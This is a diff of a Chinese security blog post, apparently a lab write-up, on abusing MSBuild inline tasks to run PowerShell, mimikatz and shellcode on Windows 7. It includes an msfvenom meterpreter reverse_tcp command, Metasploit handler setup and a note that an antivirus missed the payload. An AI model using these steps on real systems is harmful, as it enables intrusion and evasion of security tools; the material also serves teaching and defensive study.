@@ -74,7 +74,7 @@
 <meta name="description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows白加黑">
-<meta property="og:url" content="http://www.cuittk.cn/2019/12/19/Windows白加黑/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2019/12/19/Windows白加黑/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
 <meta property="og:description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
 <meta property="og:locale" content="zh-Hans">
@@ -87,7 +87,7 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/aqbqcpnqh1t3mnlfsfghe4ktsx.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/tpusvspdjprb2yofrio0qier35.png">
-<meta property="og:updated_time" content="2020-01-14T08:16:44.531Z">
+<meta property="og:updated_time" content="2020-02-26T08:09:32.592Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows白加黑">
 <meta name="twitter:description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
@@ -121,12 +121,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2019/12/19/Windows白加黑/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2019/12/19/Windows白加黑/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>Windows白加黑 | h1tler's blog</title>
   
 
@@ -264,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2019/12/19/Windows白加黑/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2019/12/19/Windows白加黑/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -361,17 +361,63 @@
         <h2 id="Windows白加黑"><a href="#Windows白加黑" class="headerlink" title="Windows白加黑"></a>Windows白加黑</h2><p>攻击机：Kali Linux ：172.16.1.130<br>受害机：Win 7_64位：172.16.1.135</p>
 <h3 id="MSBuild"><a href="#MSBuild" class="headerlink" title="MSBuild"></a>MSBuild</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台<br>MSBuild可在未安装Visual Studio的环境中编译.net的工程文件<br>MSBuild可编译特定格式的xml文件<br>更多基本知识可参照以下链接：<br><a href="https://msdn.microsoft.com/en-us/library/dd393574.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/dd393574.aspx</a></p>
 <h4 id="扩展用法"><a href="#扩展用法" class="headerlink" title="扩展用法"></a>扩展用法</h4><p>在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码<br>详细介绍可参考如下链接：<br><a href="https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396</a></p>
-<h5 id="HelloWorld示例"><a href="#HelloWorld示例" class="headerlink" title="HelloWorld示例"></a>HelloWorld示例</h5><p>以下代码保存为helloworld:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;</div><div class="line">  &lt;Target Name=&quot;Hello&quot;&gt;</div><div class="line">   &lt;HelloWorld /&gt;</div><div class="line">  &lt;/Target&gt;</div><div class="line">  &lt;UsingTask</div><div class="line">    TaskName=&quot;HelloWorld&quot;</div><div class="line">    TaskFactory=&quot;CodeTaskFactory&quot;</div><div class="line">    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</div><div class="line">    &lt;ParameterGroup/&gt;</div><div class="line">    &lt;Task&gt;</div><div class="line">      &lt;Using Namespace=&quot;System&quot; /&gt;  </div><div class="line">      &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;</div><div class="line">        &lt;![CDATA[</div><div class="line">			    Console.WriteLine(&quot;Hello World&quot;);		</div><div class="line">        ]]&gt;</div><div class="line">      &lt;/Code&gt;</div><div class="line">    &lt;/Task&gt;</div><div class="line">    &lt;/UsingTask&gt;</div><div class="line">&lt;/Project&gt;</div></pre></td></tr></table></figure></p>
+<h5 id="HelloWorld示例"><a href="#HelloWorld示例" class="headerlink" title="HelloWorld示例"></a>HelloWorld示例</h5><p>以下代码保存为helloworld:</p>
+<pre><code class="language-html">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
+  &lt;Target Name=&quot;Hello&quot;&gt;
+   &lt;HelloWorld /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask
+    TaskName=&quot;HelloWorld&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+    &lt;ParameterGroup/&gt;
+    &lt;Task&gt;
+      &lt;Using Namespace=&quot;System&quot; /&gt;  
+      &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;
+        &lt;![CDATA[
+                Console.WriteLine(&quot;Hello World&quot;);        
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+    &lt;/UsingTask&gt;
+&lt;/Project&gt;
+</code></pre>
 <p>注：保存的文件名可以任意<br>cmd下执行：<br><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld</code><br>cmd输出helloworld，如图：<br><img src="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png" alt=""></p>
 <h5 id="执行powershell命令"><a href="#执行powershell命令" class="headerlink" title="执行powershell命令"></a>执行powershell命令</h5><p>可参照三好师傅分享的POC，地址如下：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml</a><br>该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下：<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-1.png" alt=""><br>标记1TaskName可修改，但两个位置的名称需要对应<br>标记2为固定格式:<code>TaskFactory=&quot;CodeTaskFactory&quot;</code><br>标记3的路径在不同系统可能会有区别，准确的为：<br><code>$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll</code><br>系统默认安装路径为:<br><code>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll</code><br>标记4为一个简单的输出helloworld实例<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-2.png" alt=""><br>标记5为固定格式，定义为<code>public class ClassExample : Task, ITask</code><br>下载executes%20PowerShellCommands.xml重命名为：c<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c</code><br>实际测试POC如图,成功执行powershell命令<br><img src="http://img.cdn.cuittk.cn/3-3.png" alt=""></p>
 <h5 id="执行PE文件"><a href="#执行PE文件" class="headerlink" title="执行PE文件"></a>执行PE文件</h5><p>下载<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</a><br>重命名为：aa，本环境只能用64位的.net Framework加载<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa</code><br><img src="http://img.cdn.cuittk.cn/pnr8noohzjmj9dvjwo0z99jbjf.png" alt=""></p>
 <h5 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h5><p>下载32位shellcode，需要使用32位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</a><br>重命名为dd<br><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe dd</code><br><img src="http://img.cdn.cuittk.cn/wf34m6cfgp9qwmi2954xdtabp4.png" alt=""></p>
 <p>下载64位shellcode，需要使用64位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>重命名为ee<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ee</code><br>64位的能执行shellcode，但是会报错。<br><img src="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png" alt=""></p>
-<p>我们这里用64位的shellcode和64位的win7来操作。<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.118.134 lport=4444 -f csharp</code><br>生成shellcode之后我们需要用到一个三好学生师傅的<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>的模板，把里面45行之后的改为自己的shellcode<br>然后msf监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.118.134</div><div class="line">set LPORT 4444</div><div class="line">set ExitOnSession false</div><div class="line">set autorunscript migrate -n explorer.exe</div><div class="line">exploit -j</div></pre></td></tr></table></figure></p>
-<p>Meterprefer 使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. background 挂入后台session</div><div class="line">2. sessions 查看现有的后台  session</div><div class="line">3. sessions -i 1 查看后台session id为1</div></pre></td></tr></table></figure></p>
+<p>我们这里用64位的shellcode和64位的win7来操作。<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.118.134 lport=4444 -f csharp</code><br>生成shellcode之后我们需要用到一个三好学生师傅的<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>的模板，把里面45行之后的改为自己的shellcode<br>然后msf监听</p>
+<pre><code class="language-html">msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.118.134
+set LPORT 4444
+set ExitOnSession false
+set autorunscript migrate -n explorer.exe
+exploit -j
+</code></pre>
+<p>Meterprefer 使用</p>
+<pre><code class="language-html">1. background 挂入后台session
+2. sessions 查看现有的后台  session
+3. sessions -i 1 查看后台session id为1
+</code></pre>
 <p>成功反弹msf，可以执行命令<br><img src="http://img.cdn.cuittk.cn/aqbqcpnqh1t3mnlfsfghe4ktsx.png" alt=""></p>
 <p>某管家没有报毒<br><img src="http://img.cdn.cuittk.cn/tpusvspdjprb2yofrio0qier35.png" alt=""></p>
-<h5 id="遇到的沙雕问题"><a href="#遇到的沙雕问题" class="headerlink" title="遇到的沙雕问题"></a>遇到的沙雕问题</h5><p>复制shellcode报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">生成失败。</div><div class="line"></div><div class="line">“C:\test\ee_1”(默认目标) (1) -&gt;</div><div class="line">(Hello 目标) -&gt;</div><div class="line">  C:\test\ee_1(8,5): error : 此编译的源文件可以在以下位置找到:“C:\Users\test\AppData\Local\Temp\a10919e0-6aea-4146-85f5-4f5959c7a4b8.txt”</div><div class="line">C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(65,57) : error CS0103: 当前上下文中不存在名称“shellcode”C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,28) : error CS0103: 当前上下文中不存在名称“shellcode”</div><div class="line">C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,62) : error CS0103: 当前上下文中不存在名称“shellcode”</div><div class="line"> C:\test\ee_1(8,5): error MSB4036: 未找到“ClassExample”任务。请检查下列各项:1.) 项目文件中的任务名称与任务类的名称相同。2.) 任务类为“public”且实现 Microsoft.Build.Framework.ITask接口。3.) 在项目文件中或位于“C:\Windows\Microsoft.NET\Framework64\v4.0.30319目录的 *.tasks 文件中使用 &lt;UsingTask&gt; 正确声明了该任务。</div><div class="line">    0 个警告</div><div class="line">    5 个错误</div><div class="line"></div><div class="line">已用时间 00:00:00.31</div></pre></td></tr></table></figure></p>
+<h5 id="遇到的沙雕问题"><a href="#遇到的沙雕问题" class="headerlink" title="遇到的沙雕问题"></a>遇到的沙雕问题</h5><p>复制shellcode报错：</p>
+<pre><code class="language-html">生成失败。
+
+“C:\test\ee_1”(默认目标) (1) -&gt;
+(Hello 目标) -&gt;
+  C:\test\ee_1(8,5): error : 此编译的源文件可以在以下位置找到:“C:\Users\test\AppData\Local\Temp\a10919e0-6aea-4146-85f5-4f5959c7a4b8.txt”
+C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(65,57) : error CS0103: 当前上下文中不存在名称“shellcode”C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,28) : error CS0103: 当前上下文中不存在名称“shellcode”
+C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,62) : error CS0103: 当前上下文中不存在名称“shellcode”
+ C:\test\ee_1(8,5): error MSB4036: 未找到“ClassExample”任务。请检查下列各项:1.) 项目文件中的任务名称与任务类的名称相同。2.) 任务类为“public”且实现 Microsoft.Build.Framework.ITask接口。3.) 在项目文件中或位于“C:\Windows\Microsoft.NET\Framework64\v4.0.30319目录的 *.tasks 文件中使用 &lt;UsingTask&gt; 正确声明了该任务。
+    0 个警告
+    5 个错误
+
+已用时间 00:00:00.31
+</code></pre>
 <p>我直接复制的shellcode，是<code>byte[] buf = new byte[510] {</code>开头，<br>模板中是<code>byte[] shellcode = new byte[276] {</code>，太不仔细了。严格只覆盖等号后面的内容。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/</a><br><a href="https://y4er.com/post/reverse-shell-bypass/#windows%E7%99%BD%E5%8A%A0%E9%BB%91" target="_blank" rel="external">https://y4er.com/post/reverse-shell-bypass/#windows%E7%99%BD%E5%8A%A0%E9%BB%91</a></p>
 
@@ -492,7 +538,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -620,7 +666,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
